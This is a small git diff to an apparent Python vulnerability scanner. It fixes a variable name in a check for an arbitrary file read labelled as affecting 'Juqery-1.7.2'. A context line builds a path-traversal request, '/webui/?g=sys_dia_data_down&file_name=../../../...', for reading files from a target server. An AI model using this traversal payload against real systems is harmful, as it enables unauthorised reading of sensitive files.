@@ -38,7 +38,7 @@ class JqueryDirReadScan():
         head = results["header"]
         proxy = results["proxy"]
         self.verify = results["ssl"]
-        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
+        self.headers, self.proxy = ReqSet(header=head, proxy=proxy, bwork=self.batch)
         if not self.batch:
             OutPrintInfo("JQuery", "开始检测Juqery-1.7.2任意文件读取")
         new_url = url + f"/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../{file}"
